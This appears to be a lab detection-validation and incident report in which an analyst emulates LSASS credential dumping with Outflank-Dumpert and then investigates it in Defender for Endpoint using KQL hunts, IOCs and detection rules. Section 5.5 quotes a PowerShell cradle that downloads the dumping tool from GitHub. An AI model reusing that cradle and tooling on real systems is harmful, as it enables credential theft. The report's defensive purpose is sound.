# Detection Validation & Incident Investigation
## LSASS Credential Dumping via Outflank-Dumpert (MITRE ATT&CK T1003.001)

**Analyst:** Olayinka Oyetade
**Discipline:** Security Operations / Detection Engineering / Adversary Emulation
**Platform:** Microsoft Defender for Endpoint (MDE) | Microsoft Defender XDR Advanced Hunting (KQL)
**Environment:** Windows Server 2025 Datacenter (`winserv2025`), Azure-hosted, MDE onboarded
**Emulation tooling:** Atomic Red Team
**Date of exercise:** 07 June 2026

---

## 1. Executive Summary

This report documents an end-to-end **adversary emulation and blue-team investigation** of a credential-theft attack chain. I emulated a realistic intrusion in which an attacker downloads and executes a credential-dumping tool to steal secrets from the Windows LSASS process, then performed a full Security Operations investigation as though responding to a live incident.

The objective was twofold: **validate that Microsoft Defender for Endpoint detects the activity**, and **demonstrate the full investigative workflow** a SOC analyst follows to confirm an intrusion, scope its impact, and recommend containment.

The emulated attack succeeded in dumping LSASS memory (a **53 MB credential dump** was written to disk), and MDE detected it, raising multiple high-severity alerts and automatically isolating the host through Attack Disruption. Through structured triage and KQL threat hunting, I reconstructed the complete attack lifecycle from initial execution to post-exploitation discovery, enriched the findings with threat intelligence, and confirmed the activity as a **True Positive**.

**Why this matters to a business:** LSASS credential dumping (MITRE T1003.001) is one of the most common and damaging steps in modern intrusions. It is a recurring precursor in ransomware operations, because a single successful dump can hand an attacker every credential cached on a machine, enabling pass-the-hash and lateral movement across an entire domain. Validating that an EDR detects this technique, and that analysts can investigate it confidently, is exactly the capability that shrinks attacker dwell time and stops a single compromised host from becoming a domain-wide breach.

---

## 2. Skills Demonstrated

| Capability | Evidence in this investigation |
|---|---|
| Alert triage and prioritisation | Distinguished a genuine high-severity credential-access alert from benign correlated noise |
| EDR / MDE operation | Process-tree analysis, device timeline review, incident correlation, Attack Disruption handling |
| Threat hunting with KQL | Authored and tuned multiple Advanced Hunting queries across `DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`, `DeviceEvents` |
| MITRE ATT&CK fluency | Mapped every stage of the attack to ATT&CK tactics and techniques |
| Threat intelligence enrichment | VirusTotal reputation analysis of both the malicious binary and outbound domains |
| Impact analysis | Confirmed credential-dump success through file-creation telemetry and artifact size |
| Detection engineering | Produced reusable detection logic with false-positive considerations |
| Incident reporting | This document: clear for non-technical stakeholders, rigorous for technical reviewers |

---

## 3. Lab Environment

| Component | Detail |
|---|---|
| Host | `winserv2025` (Windows Server 2025 Datacenter) |
| Device ID | `0891dcf7d7bef51643b86555d806a9974d94a24b` |
| EDR | Microsoft Defender for Endpoint, fully onboarded, telemetry confirmed |
| Defender for Servers | Plan enabled via Defender for Cloud |
| Emulation framework | Atomic Red Team (`C:\AtomicRedTeam\`) |
| Investigation interface | Microsoft Defender XDR portal + Advanced Hunting (KQL) |
| Account in scope | `mrdaniel98` (local interactive user) |

> **Why this design:** A focused single-host lab with full EDR telemetry mirrors the foundational visibility a SOC analyst works with daily. A clean, well-understood environment makes detection validation defensible, because every event can be attributed and explained.

---

## 4. Attack Narrative (Emulated)

The emulated adversary followed a compact but realistic credential-theft chain:

1. **Execution.** A PowerShell download cradle reached out to a public code-hosting site, created a staging directory, and downloaded a credential-dumping binary (`Outflank-Dumpert.exe`) to disk.
2. **Execution (handoff).** `cmd.exe` launched the downloaded binary.
3. **Credential Access.** `Outflank-Dumpert.exe` accessed the memory of `lsass.exe` and wrote a full process memory dump to `C:\Windows\Temp\dumpert.dmp`.
4. **Discovery.** Within the same session, host and identity enumeration commands (`whoami`, `hostname`) executed under PowerShell, consistent with an operator manually orienting after gaining access.

Outflank-Dumpert is a notable choice for this emulation because it is purpose-built to evade endpoint defenses: it uses direct system calls and API unhooking to dump LSASS while avoiding the userland hooks many EDRs rely on. Validating detection against an evasion-aware tool is a stronger test than a naive `procdump` run.

---

## 5. Investigation Walkthrough

This section follows the actual order of investigation. It is written to show analyst reasoning, not just findings.

### 5.1 Initial Alert and Triage Discipline

The investigation began from an MDE alert flagged as **potential human-operated suspicious activity**. Before drawing any conclusion, I reviewed the surrounding device timeline to understand context. The activity immediately preceding the alert was a browser session (WhatsApp Web), which is expected baseline behavior for this host and not relevant to the alert.

I then examined the process tree at the top of the alert chain:

`wininit.exe (700)` -> `services.exe (840)` -> `mssense.exe (3080)`

**Analyst assessment:** This is the legitimate Windows boot chain. `wininit.exe` is the Windows initialization process, it spawns `services.exe`, and `services.exe` launching `mssense.exe` (the MDE sensor) is expected. All three images are Microsoft-signed with a 0/71 VirusTotal ratio, and the execution timestamps align with system startup. This branch is benign.

Critically, I did **not** close the investigation here. A benign boot chain appearing inside a flagged incident is a signal to ask *what else MDE correlated into this incident*, not a reason to dismiss it. This is the difference between clearing an alert and actually investigating it.

### 5.2 Scoping the Incident

I reviewed the impacted assets to understand blast radius.

| Asset | Type | Risk |
|---|---|---|
| `winserv2025` | Device | High |
| `mrdaniel98` | User | Compromised account (flagged) |

### 5.3 Separating Signal from Correlated Noise

The incident timeline contained several events. Two were high-severity, one was a lower-value correlated artifact.

The `msedge.exe renamed Local State` event initially drew attention because the file's signer showed as **Unknown**. I investigated rather than assuming. The file-rename telemetry showed:

- **PreviousFileName:** `Edge-Local-State-Tmp-0e697113-4bf7-46c8-8b9a-08ad111db747.tmp`
- **PreviousFolderPath:** `C:\Users\mrdaniel98\AppData\Local\Microsoft\Edge\User Data`
- **ActionType:** `FileRenamed`

**Analyst assessment:** This is the atomic safe-write pattern Chromium-based browsers use universally. Edge writes profile state to a temporary file, then renames it to `Local State` to prevent corruption. It was pulled into the incident by correlation with the genuinely malicious activity on the same account, not because it is independently malicious. I documented it as benign correlated noise and refocused on the two high-severity alerts.

> **Tradecraft note:** A clear signal of analyst maturity is the ability to recognise when a flagged artifact is correlation noise rather than chasing it indefinitely. Equally important is verifying before dismissing. Both happened here.

### 5.4 The Real Lead: Credential Access (T1003.001)

The two high-severity alerts pointed to the core of the incident:

- **Compromised account credentials** (Tactic: Credential Access)
- **Compromised account conducting hands-on-keyboard attack** (Tactic: Lateral Movement)

The credential-access alert was explicitly tagged **T1003.001 — LSASS Memory** and named the responsible process: `Outflank-Dumpert.exe` reading `lsass.exe` process memory.

I examined the process tree for this alert and reconstructed the execution chain:

```
powershell.exe (8768)        Initial download cradle
   └── cmd.exe (10080)       /c "...\ExternalPayloads\Outflank-Dumpert.exe"
        └── Outflank-Dumpert.exe (2764)   Unsigned, VT 52/70
             └── accessed lsass.exe (856)  Credential Access
```

Key indicators from the process tree:

| Indicator | Value | Significance |
|---|---|---|
| Payload signer | Unknown | Legitimate tooling is signed |
| VirusTotal ratio | **52/70** | High-confidence malicious binary |
| Execution path | `C:\AtomicRedTeam\ExternalPayloads\` | Non-standard, staged location |
| Target process | `lsass.exe` | Holds NTLM hashes, Kerberos tickets, cached credentials |

**Analyst assessment:** A VirusTotal ratio of 52/70 on an unsigned binary that accesses LSASS is unambiguous. This alone closes the question of whether the binary is malicious. The remaining work was to confirm *how it arrived* and *whether it succeeded*.

### 5.5 Confirming the Delivery Mechanism

I pivoted to Advanced Hunting (KQL) to find how the binary reached the host. The initiating PowerShell command line told the full story:

```powershell
"powershell.exe" & {
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  New-Item -ItemType Directory (Split-Path "C:\AtomicRedTeam\...\ExternalPayloads\Outflank-Dumpert.exe") -Force | Out-Null
  Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/.../Outflank-Dumpert.exe" -OutFile "C:\AtomicRedTeam\...\ExternalPayloads\Outflank-Dumpert.exe"
}
```

This is a textbook **stage-and-execute download cradle**:

1. Forces TLS 1.2 to ensure the download succeeds.
2. Creates a staging directory.
3. Downloads the payload from a public code-hosting URL via `Invoke-WebRequest`.
4. Saves it for execution by `cmd.exe`.

### 5.6 Confirming Impact: Did the Dump Succeed?

The most important question in any credential-access incident: **did the attacker actually obtain credentials?** I hunted for the dump artifact.

```kql
DeviceFileEvents
| where DeviceName == "winserv2025"
| where FileName == "dumpert.dmp"
| project Timestamp, FileName, FolderPath, ActionType, FileSize, InitiatingProcessFileName, SHA256
```

Result:

| Field | Value |
|---|---|
| FileName | `dumpert.dmp` |
| FolderPath | `C:\Windows\Temp\dumpert.dmp` |
| ActionType | `FileCreated` |
| **FileSize** | **55,577,992 bytes (≈53 MB)** |
| InitiatingProcessFileName | `outflank-dumpert.exe` |
| SHA256 | `7dbdac5eb14bc2718ef9bfdf8486f4d97ee09cceb10d936c33df227ff2cf2798` |

**Analyst assessment:** The dump succeeded. A 53 MB artifact is consistent with a full LSASS memory image, not a failed or empty write. At this point the impact is confirmed: the attacker possesses a credential dump that can be parsed offline (for example with Mimikatz) to extract every hash and ticket cached on the host. **This is the moment a real incident escalates from "suspicious" to "contain now."**

### 5.7 Post-Exploitation Hunting

I queried process activity in the session window to understand what the operator did around the time of the dump.

```kql
DeviceProcessEvents
| where DeviceName == "winserv2025"
| where Timestamp >= datetime(2026-06-07T15:45:14Z)
| where InitiatingProcessFileName in~ ("powershell.exe", "cmd.exe", "Outflank-Dumpert.exe")
| where FileName !in~ ("WerFault.exe", "mssense.exe", "conhost.exe")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

Observed activity in the session window:

| Activity | Process | ATT&CK mapping | Assessment |
|---|---|---|---|
| Identity enumeration | `whoami.exe` | T1033 (System Owner/User Discovery) | Operator orienting on privileges held by the compromised account |
| Host enumeration | `hostname.exe` | T1082 (System Information Discovery) | Operator confirming the machine they landed on |
| Scheduled task creation | `schtasks.exe /create` | T1053.005 (Scheduled Task) | Persistence-style activity present in the session window |
| On-host compilation | `csc.exe /noconfig` | T1027 / LOLBin abuse | C# compiler invocation; flagged as an additional hunt lead |

**Analyst assessment:** The `whoami` and `hostname` enumeration is the clearest attacker-relevant post-exploitation behavior. Running identity and host discovery immediately around a credential dump is characteristic of a **human operator** making real-time decisions, which is consistent with MDE's "hands-on-keyboard" classification. (Note: in this emulation, the scheduled-task and `csc.exe` events partly trace back to the Atomic Red Team harness; in a production incident these same patterns would each warrant their own dedicated hunt, and they are documented here as leads rather than confirmed adversary persistence.)

### 5.8 Exfiltration Hunt (Network Analysis)

The final question: **did the 53 MB dump leave the machine?** I analysed outbound connections from the attack-relevant processes.

```kql
DeviceNetworkEvents
| where DeviceName == "winserv2025"
| where Timestamp >= datetime(2026-06-07T15:45:14Z)
| where InitiatingProcessFileName in~ ("powershell.exe", "cmd.exe", "Outflank-Dumpert.exe")
| project Timestamp, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

| Destination | IP | Port | Assessment |
|---|---|---|---|
| `github.com` | 140.82.113.3 | 443 | Payload download source (the staging connection already documented) |
| `cdn.oneget.org` | 150.171.110.18 | 443 | Microsoft PowerShell package CDN, benign module-install traffic |
| `www.powershellgallery.com` / `cdn.powershellgallery.com` | 150.171.110.23 / 2.16.170.218 | 443 | Microsoft PowerShell Gallery, benign |

I enriched the most interesting outbound domain with threat intelligence.

**Analyst assessment:** VirusTotal returned 0/91 for `cdn.oneget.org`, and the surrounding context (Microsoft-owned package infrastructure, traffic occurring during module installation, ranked in the top-10K domains) confirms it as benign. Most importantly, **no outbound connection was observed from `Outflank-Dumpert.exe` itself, and no exfiltration of the dump file was detected.**

> **Tradecraft note:** A clean VirusTotal result does not by itself prove a domain is safe; it only means no engine has flagged it. The benign conclusion here rests on corroborating context (ownership, timing, purpose), not on the score alone.

This means the credential dump remained local at the time of detection. In a real incident this points to one of three possibilities, all of which the report should flag: the operator intended manual retrieval in a later session, MDE's Attack Disruption severed the session before exfiltration, or retrieval was planned via a different channel.

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Observed behavior |
|---|---|---|---|
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Download cradle (`Invoke-WebRequest`, TLS 1.2 enforcement) staging the payload |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | `cmd.exe /c` launching the downloaded binary |
| Credential Access | OS Credential Dumping: LSASS Memory | **T1003.001** | `Outflank-Dumpert.exe` reading `lsass.exe` memory and writing `dumpert.dmp` |
| Discovery | System Owner/User Discovery | T1033 | `whoami` enumeration |
| Discovery | System Information Discovery | T1082 | `hostname` enumeration |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | `schtasks /create` observed in session window (hunt lead) |
| Defense Evasion | Direct syscalls / API unhooking | (tool capability) | Outflank-Dumpert evades userland EDR hooks to access LSASS |

---

## 7. Indicators of Compromise (IOCs)

**Malicious binary — `Outflank-Dumpert.exe`**

| Type | Value |
|---|---|
| SHA1 | `c494bbb35b2b53b3a05aef627710e27c7c800a1f` |
| SHA256 | `f323569e5d64a3aa60045bd06c2421e729d1c0d79028aba9e227d9eeaeec62e5` |
| MD5 | `69c05093eb542e1c29a556a29e74e99a` |
| On-disk path | `C:\AtomicRedTeam\ExternalPayloads\Outflank-Dumpert.exe` |
| VirusTotal | 52/70 |

**Credential dump artifact — `dumpert.dmp`**

| Type | Value |
|---|---|
| SHA256 | `7dbdac5eb14bc2718ef9bfdf8486f4d97ee09cceb10d936c33df227ff2cf2798` |
| On-disk path | `C:\Windows\Temp\dumpert.dmp` |
| Size | 55,577,992 bytes |

**Network (defanged)**

| Indicator | Note |
|---|---|
| `hxxps://github[.]com/clr2of8/Dumpert/raw/.../Outflank-Dumpert.exe` | Payload download URL. The specific raw URL is the indicator; `github.com` itself is a legitimate, widely abused host and should not be blocked wholesale. |

**Host / identity**

| Indicator | Value |
|---|---|
| Host | `winserv2025` |
| Device ID | `0891dcf7d7bef51643b86555d806a9974d94a24b` |
| Affected account | `mrdaniel98` |

---

## 8. Detection Engineering

Beyond responding to the built-in MDE alerts, the following reusable detection logic captures this attack class. Each query is paired with a note on tuning and false positives, because a detection that fires constantly is as useless as one that never fires.

### 8.1 LSASS memory access by a non-system process (core T1003.001 detection)

```kql
DeviceEvents
| where ActionType == "LsassProcessAccess"
| where InitiatingProcessFileName !in~ (
    "MsMpEng.exe", "mssense.exe", "svchost.exe", "csrss.exe",
    "wininit.exe", "lsass.exe", "services.exe"
  )
| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName,
          InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp asc
```

**What it catches:** Any process outside a known-good allowlist reading LSASS memory, the defining behavior of T1003.001.
**False-positive tuning:** Legitimate security and backup agents touch LSASS. Build the allowlist from your own environment baseline rather than copying one blindly. Promote to alert once the allowlist is stable.

### 8.2 PowerShell download cradle writing an executable to disk

```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "powershell.exe"
| where ProcessCommandLine has_any ("Invoke-WebRequest", "IWR", "Net.WebClient", "DownloadFile", "DownloadString")
| where ProcessCommandLine has_any (".exe", "-OutFile")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp asc
```

**What it catches:** The staging step, where PowerShell pulls a remote binary to disk. This is the delivery mechanism for a large share of commodity intrusions.
**False-positive tuning:** Some legitimate installers and automation use this pattern. Pair with reputation (unsigned output, new file) or destination analysis to raise fidelity.

### 8.3 Suspicious memory-dump artifact in a temporary path

```kql
DeviceFileEvents
| where ActionType == "FileCreated"
| where FileName endswith ".dmp"
| where FolderPath has_any ("\\Temp\\", "\\Tasks\\", "\\AppData\\", "\\ProgramData\\")
| where InitiatingProcessFileName !in~ ("WerFault.exe", "dwwin.exe")
| project Timestamp, DeviceName, FileName, FolderPath, FileSize, InitiatingProcessFileName
| order by Timestamp asc
```

**What it catches:** The on-disk evidence of a successful dump, useful as a backstop when the access event is missed or when reviewing historically.
**False-positive tuning:** Windows Error Reporting (`WerFault.exe`) legitimately creates `.dmp` files and is excluded above. Large dumps from unexpected parents are the signal.

### 8.4 Detection validation summary

| Detection layer | Did it fire in this exercise? |
|---|---|
| MDE built-in: T1003.001 LSASS Memory alert | Yes |
| MDE built-in: Compromised account / hands-on-keyboard | Yes |
| MDE Attack Disruption (automatic host isolation) | Yes |
| Custom analytic 8.1 (LSASS access) | Validated against telemetry |
| Custom analytic 8.3 (dump artifact) | Validated against telemetry |

---

## 9. Findings and Conclusion

**Verdict: Confirmed True Positive.**

A credential-dumping tool was downloaded via a PowerShell cradle, executed through `cmd.exe`, and successfully dumped LSASS memory to a 53 MB file on disk. Identity and host discovery commands ran in the same session, consistent with hands-on-keyboard operation. No exfiltration of the dump was observed at the time of detection.

Microsoft Defender for Endpoint **successfully detected** the activity, raising high-severity Credential Access and Lateral Movement alerts, an explicit T1003.001 alert, and automatically isolating the host through Attack Disruption. The detection coverage for this technique on this platform is validated.

---

## 10. Recommended Response Actions

Written as the containment, eradication, and recovery guidance a SOC would attach to this incident.

**Immediate (Containment)**
1. Isolate `winserv2025` from the network (MDE performed this automatically; confirm it held).
2. Treat the `mrdaniel98` account and **every credential cached on the host** as compromised.
3. Preserve `C:\Windows\Temp\dumpert.dmp` and related artifacts for forensic analysis before removal.

**Eradication**
4. Remove `Outflank-Dumpert.exe` and the staging directory.
5. Force a password reset for `mrdaniel98` and any account that had logged on to the host. Rotate local admin and any service-account secrets that may be cached.
6. Invalidate active Kerberos tickets for affected identities (consider a `krbtgt` reset if domain-joined and broader compromise is suspected).

**Recovery and Hardening**
7. Enable **LSA Protection (RunAsPPL)** and **Credential Guard** to make LSASS dumping materially harder.
8. Deploy the custom detection analytics in Section 8 as scheduled detections.
9. Add a custom indicator for the payload hashes.
10. Restrict PowerShell with Constrained Language Mode and script-block logging where operationally feasible.

---

## 11. Analyst Notes / Lessons Learned

- **Telemetry-first investigation works.** Reading the attack command and knowing what telemetry to expect turned triage from reactive into directed hunting.
- **Confirming impact is the analyst's job, not an assumption.** The dump file size was the difference between "a tool ran" and "credentials were stolen." Always answer the "did it succeed" question with evidence.
- **Verify before dismissing, and dismiss when verified.** The Edge `Local State` rename was worth one query to clear; chasing it further would have wasted time on the real lead.
- **Reputation scores are an input, not a verdict.** Both the malicious binary (52/70) and the benign domain (0/91) were interpreted in context, not on score alone.
- **Tooling can interfere with itself.** During the exercise, MDE Attack Disruption auto-isolated the host mid-emulation. Recognising that the EDR was severing the process chain, and managing the lab safely around it, is itself a real operational skill.

---

*Prepared by Olayinka Oyetade. This is a controlled detection-validation exercise conducted in an isolated lab the analyst owns and operates. No production systems, third-party data, or unauthorised targets were involved.*
